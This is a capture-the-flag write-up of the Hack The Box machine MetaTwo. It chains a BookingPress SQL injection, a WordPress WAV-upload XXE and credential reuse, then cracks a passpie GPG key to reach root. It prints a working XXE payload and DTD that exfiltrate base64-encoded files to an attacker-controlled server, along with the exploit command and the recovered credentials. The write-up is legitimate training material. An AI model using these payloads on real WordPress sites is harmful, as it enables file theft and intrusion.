---
layout: post
title: "HTB: MetaTwo"
subtitle: "BookingPress unauth SQLi to crack a manager, WordPress XXE to read wp-config FTP creds, then a passpie GPG store to root"
date: 2023-02-02
tags: [htb, linux, wordpress, sqli, xxe]
category: writeups
kind: machine
tldr: "An unauthenticated SQL injection in the BookingPress WordPress plugin (CVE-2022-0739) dumps password hashes and I crack the manager. An authenticated Media Library XXE (CVE-2021-29447) reads wp-config.php for the FTP password, which leads to send_email.php and jnelson's SSH creds. Root comes from a passpie GPG store cracked with gpg2john."
---

## the box

MetaTwo is a Linux box running WordPress 5.6.2 on `metapress.htb`. nmap:

```
21/tcp open  ftp     ProFTPD Server (Debian)
22/tcp open  ssh     OpenSSH 8.4p1 Debian
80/tcp open  http    nginx 1.18.0
```

The site uses the `twentytwentyone` theme and has an `/events` page that books appointments. After booking, it redirects to `/thank-you/?appointment_id=NQ==`. The booking widget is the BookingPress plugin, around version 1.0.10.

## recon

BookingPress 1.0.10 has an unauthenticated SQL injection, CVE-2022-0739 (fixed in 1.0.11), in the `bookingpress_front_get_category_services` AJAX action. The injectable parameter is `total_service`, and the query exposes 9 columns for a UNION. The public exploit needs a valid `_wpnonce`, which sits in the `/events/` page source next to the `action:'bookingpress_front_get_category_services'` call.

## foothold

With the nonce in hand I ran the PoC against the database:

```bash
python3 booking-press-expl.py -u http://metapress.htb -n 'f071f53b5a'
```

It dumped the WordPress user hashes:

```
|admin|admin@metapress.htb|$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.|
|manager|manager@metapress.htb|$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70|
```

John cracked the manager hash to `partylikearockstar`, which logs into `wp-admin` as `manager`.

As an authenticated user I have the Media Library, which in WordPress 5.6.2 is vulnerable to XXE through crafted WAV uploads, CVE-2021-29447. The audio metadata parser processes the embedded XML, so a WAV with an external entity reference reaches out to my server and pulls a remote DTD back.

The WAV carries the entity declaration:

```wav
RIFFWAVEiXML{<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM 'http://10.10.16.36:8484/evil.dtd'>%remote;%init;%trick;] >
```

And `evil.dtd`, hosted on my box, base64-encodes a target file and exfiltrates it as a query parameter:

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.16.36:8484/?p=%file;'>" >
```

That read `/etc/passwd` and confirmed the `jnelson` user. No SSH key came back, so I pointed the DTD at the nginx config (`/etc/nginx/sites-enabled/default`), found the webroot at `/var/www/metapress.htb/blog`, then read `wp-config.php`.

## user

`wp-config.php` had both database and FTP credentials:

```php
define( 'FTP_USER', 'metapress.htb' );
define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
define( 'FTP_HOST', 'ftp.metapress.htb' );
```

Logging into FTP with those creds, I found `send_email.php`, which contained SMTP credentials:

```php
$mail->Username = "jnelson@metapress.htb";
$mail->Password = "Cb4_JmWM8zUZWMu@Ys";
```

Those mail credentials are reused for SSH:

```bash
ssh jnelson@10.10.11.186   # Cb4_JmWM8zUZWMu@Ys
```

That gives the user flag.

## root

In jnelson's home is a `.passpie` directory, the file store for the passpie password manager. The `ssh/root` entry holds a PGP-encrypted password, and `.passpie/.keys` contains the PGP private and public key blocks.

I copied `.keys` over with scp, deleted the public key portion, and turned the private key into a crackable hash:

```bash
gpg2john .keys > hash
john hash
```

John recovered `blink182`. That is not the root password directly, it is the passphrase that unlocks the passpie store. Back on the box, I exported the vault:

```bash
touch pass
passpie export pass
```

The export revealed the root SSH password:

```
fullname: root@ssh
login: root
password: !!python/unicode 'p7qfAZt4_A1xo_0x'
```

`su` to root with that password gives the root flag.

## takeaway

Two known CVEs chain cleanly: the SQLi gets an authenticated session, and authentication is the precondition for the XXE. The XXE itself is a file-read primitive, so its value is entirely in knowing which files to read, wp-config first for FTP, then chasing reused credentials from FTP to SMTP to SSH. The root step is a reminder that a password manager only protects you if its master passphrase is not crackable with rockyou.
